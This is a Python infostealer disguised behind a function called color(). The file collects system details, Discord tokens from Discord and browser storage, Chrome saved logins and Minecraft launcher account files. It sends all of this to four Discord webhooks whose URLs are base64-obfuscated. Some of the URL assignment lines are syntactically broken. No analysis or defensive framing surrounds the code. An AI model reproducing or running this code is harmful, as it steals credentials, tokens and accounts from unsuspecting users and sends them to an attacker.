import os
import re
import json
import requests
import sqlite3
import base64
import subprocess
from pathlib import Path

encoded_url = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1OTY3NTAyOTkxMDE5MjIwOC9mYmlXRzJmME03M0NmZXZ2WDFocTZCRG1TVXJFLUhCX1JjV0J4M1V5TGtiRDZpWjU4cXNoNEFMeWJ1NGdxZHp4U0Y4dQ=="
decoded_url = base64.b64decode(encoded_url).decode("utf-8")
encoded_url1"aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1OTY5NzA0ODYzODg0OTMyNS93ZWpraEo4VXpsTE12czllNEQ0eG1zQ1lKQjVrQ2FIRTl1RFhqdmxVNTlwMmtSTHcxbjZES0JpVEwwMENlSkRzQUJjQQ=="
decoded_url1 = base64.b64decode(encoded_url1).decode("utf-8")
encoded_url2"aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1OTY5NzUwMzM1NTc5NzUxNC9zd21fbUtpdGwza25GOGQ0NDhCRlVnejRpdzFZM1ZkRTE0cmtCb3pVSVFBR3hSc3VuTkN3YXRGNWhLRXdYMlFNRC01ZA=="
decoded_url2 = base64.b64decode(encoded_url2).decode("utf-8")
encoded_url3"aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM1OTY5NzcxNDAzNTgxODUzNi9nbHp5UjhBQkstS3Z5N2VpLWI3TUJCbElqRlpUMHBxSmtYNWFldWJYU0oyMldqbTk0TGY3dVFsdWtzel9aRVRWMllvag=="
decoded_url3 = base64.b64decode(encoded_url3).decode("utf-8")

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def get_system_info():
    try:
        username = os.getlogin()
        computer_name = os.getenv("COMPUTERNAME", "Unknown")
        hwid = subprocess.getoutput("wmic csproduct get UUID").split("\n")[1].strip()
        return f"User: {username}\nPC: {computer_name}\nHWID: {hwid}\nIP: {get_public_ip()}"
    except:
        return "System Info Not Available"

def find_discord_tokens():
    paths = [
        Path(os.getenv("APPDATA", "")) / "discord" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA", "")) / "discordcanary" / "Local Storage" / "leveldb",
        Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
        Path(os.getenv("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
        Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
    ]

    tokens = []
    token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")

    for path in paths:
        if path.exists():
            for file in path.glob("*.ldb"):
                try:
                    with file.open("r", encoding="latin1") as f:
                        matches = token_pattern.findall(f.read())
                        tokens.extend(matches)
                except:
                    continue

    return "\n".join(tokens) if tokens else "No Discord tokens found."

def find_browser_passwords():
    db_path = Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not db_path.exists():
        return "No saved browser passwords found."

    try:
        conn = sqlite3.connect(str(db_path))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()
        conn.close()

        output = []
        for row in data:
            url, username, encrypted_password = row
            output.append(f"Site: {url}\nUser: {username}\nPass: (Encrypted) {base64.b64encode(encrypted_password).decode()}")

        return "\n".join(output) if output else "No passwords found."
    except:
        return "Failed to extract passwords."

def find_minecraft_accounts():
    account_paths = {
        "ATLauncher": os.path.join(os.getenv("APPDATA", ""), "ATLauncher", "configs", "accounts.json"),
        "LunarClient": os.path.join(os.getenv("USERPROFILE", ""), ".lunarclient", "settings", "game", "accounts.json")
    }

    accounts_found = []

    for client, path in account_paths.items():
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as file:
                    accounts_data = json.load(file)
                    for account in accounts_data:
                        account_info = f"**{client} Account Found**\n- Client: {client}\n- Username: {account.get('username')}\n- Password: {account.get('password')}"
                        accounts_found.append(account_info)
            except Exception as e:
                accounts_found.append(f"Failed to read {client} account data: {str(e)}")

    return "\n".join(accounts_found) if accounts_found else "No Minecraft accounts found."

def send_to_webhook(data):
    try:
        requests.post(decoded_url, json={"content": f"```{data}```"})
        requests.post(decoded_url1, json={"content": f"```{data}```"})
        requests.post(decoded_url2, json={"content": f"```{data}```"})
        requests.post(decoded_url3, json={"content": f"```{data}```"})
    except Exception as e:
        print(f"Failed to send data to webhook: {str(e)}")

def color(colorthang):
    sys_info = get_system_info()
    discord_tokens = find_discord_tokens()
    browser_passwords = find_browser_passwords()
    minecraft_accounts = find_minecraft_accounts()
    print(colorthang)
    send_to_webhook(sys_info)
    send_to_webhook(discord_tokens)
    send_to_webhook(browser_passwords)
    send_to_webhook(minecraft_accounts)

